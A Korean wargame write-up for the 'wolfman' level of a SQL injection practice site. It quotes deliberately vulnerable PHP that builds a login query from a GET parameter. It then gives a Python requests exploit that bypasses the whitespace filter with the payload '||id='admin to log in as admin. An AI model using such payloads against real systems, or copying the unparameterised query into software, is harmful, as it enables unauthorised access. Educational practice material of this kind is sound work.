## Wolfman Write-up

### 문제
``` php
<?php  
include "./config.php";  
login_chk();  
dbconnect();  
if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");  
if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~");  
$query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'";  
echo "<hr>query : <strong>{$query}</strong><hr><br>";  
$result = @mysql_fetch_array(mysql_query($query));  
if($result['id']) echo "<h2>Hello {$result[id]}</h2>";  
if($result['id'] == 'admin') solve("wolfman");  
highlight_file(__FILE__);  
?>
```

### Exploit 코드
``` python
import requests

url = 'https://los.rubiya.kr/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php'
cookies = {'PHPSESSID' : 'My PHPSESSID'}
params= {}
params['pw'] = "'||id='admin"

res = requests.get(url, cookies=cookies, params=params)
if "Clear" in res.text :
    print("[♪] WOLFMAN Clear!")
```
이번 문제는 id가 admin이면 풀리는 문제이다.
쿼리문을 보면 이미 `id='guest'`로 되어있는데 이를 우회하면 된다.
공백이 필터링 되어 있으니 공백 없이 쓰면 된다.
GET 방식으로 전송되는 pw에 `'||id='admin`을 넣어주면 쿼리문은 아래와 같이 된다.
``` php
select id from prob_wolfman where id='guest' and pw=''||id='admin'
```
id가 admin이므로 문제가 풀린다.